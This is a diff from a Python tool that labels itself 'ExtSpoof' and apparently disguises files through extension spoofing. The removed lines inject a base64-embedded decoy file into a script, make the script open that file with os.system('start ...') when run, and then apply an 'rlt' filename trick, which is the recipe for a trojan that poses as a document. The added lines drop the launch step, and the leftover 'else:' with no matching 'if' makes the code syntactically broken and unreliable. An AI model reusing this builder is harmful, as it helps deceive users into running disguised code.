@@ -99,33 +99,23 @@ def ctm(command):
             command.append("")
     argv1 = command[1]
     argv2 = command[2]
-    if os.path.exists(argv1):
-        os.rename(argv1, str(argv1+"w"))
-        if os.path.exists(argv2):
-            argv1 = str(argv1)+"w"
-            f = open(argv1, "r")
-            contents = f.readlines()
-            contents.insert(0, f"import base64, os\n")
-            pdf_f = open(f"{argv2}", "br")
-            pdfcontent = pdf_f.read()
-            pdf_f.close()
-            contents.insert(1, f"f = open('{argv2}', 'w')\n")
-            encoded_pdf = str(pdfcontent).encode('ascii')
-            b64_pdf = base64.b64encode(encoded_pdf)
-            b64_pdf = b64_pdf.decode('ascii')
-            contents.insert(2, f"b64 = '''\n{b64_pdf}\n'''\n")
-            contents.insert(3, f"b64 = b64.encode('ascii')\n")
-            contents.insert(4, f"b64_decoded = base64.b64decode(b64)\n")
-            contents.insert(5, f"b64_decoded = b64_decoded.decode('ascii')\n")
-            contents.insert(6, f"f.write(b64_decoded)\n")
-            contents.insert(7, f"f.close()\n")
-            contents.insert(8, f"os.system('start {argv2}')\n")
-            f.close()
-            f = open(argv1, "w")
-            f.write("".join(contents))
-            f.close()
-            argv2 = argv2.split(".")
-            rlt(f"rlt {argv1} {argv2[1]}")
+
+    
+    input_data = argv1
+    output_file = argv2
+    # Encode the PDF file into a string
+    with open(input_data, "rb") as pdf_file:
+        encoded_string = base64.b64encode(pdf_file.read()).decode("utf-8")
+    
+    with open(output_file, "a") as new_code:
+        new_code.write("\n\nimport base64\n\n")
+        new_code.write("encoded_pdf = \"" + encoded_string + "\"\n\n")
+        new_code.write("# Decode the PDF string back into bytes\n")
+        new_code.write("decoded_pdf = base64.b64decode(encoded_pdf)\n\n")
+        new_code.write("# Write the decoded PDF bytes into a new file\n")
+        new_code.write("with open(\"decoded.pdf\", \"wb\") as pdf_file:\n")
+        new_code.write("    pdf_file.write(decoded_pdf)\n")
+    print("(ExtSpoof) - Success.")
 
     else:
         print("(ExtSpoof) - File was not found.")
